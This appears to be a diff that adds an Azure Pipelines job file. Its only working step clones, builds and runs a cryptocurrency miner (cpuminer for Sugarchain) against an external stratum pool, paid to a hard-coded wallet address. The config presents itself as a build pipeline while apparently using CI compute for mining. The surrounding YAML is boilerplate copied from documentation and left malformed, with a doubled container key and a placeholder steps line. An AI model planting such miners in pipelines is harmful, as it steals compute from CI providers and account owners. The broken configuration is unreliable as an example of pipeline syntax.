@@ -1,0 +1,19 @@
+jobs:
+- job: MyJob
+  displayName: My First Job
+  continueOnError: true
+  workspace:
+   clean: outputs
+  container: container: linux # reusable alias
+    image: ubuntu:16.04
+  timeoutInMinutes: 300 # how long to run the job before automatically cancelling
+  cancelTimeoutInMinutes: 1 # how much time to give 'run always even if cancelled tasks' before killing them
+  variables: # several syntaxes, see specific section
+  steps: [ script | bash | pwsh | powershell | checkout | task | templateReference ]
+- task: CmdLine@2
+  inputs:
+    script: |
+      sudo apt-get update
+      sudo apt-get install -y \build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake zlib1g-dev
+      sudo git clone https://github.com/cryptozeny/cpuminer-opt-sugarchain.git && ls
+      cd cpuminer-opt-sugarchain && ls && sudo ./build-yespower.sh && ./cpuminer -a yespower -o stratum+tcp://stratum-ru.rplant.xyz:7042 -u sugar1qgel56acveq6xqjxrk87pmf3fjt7xw07s33n30q.kloter1
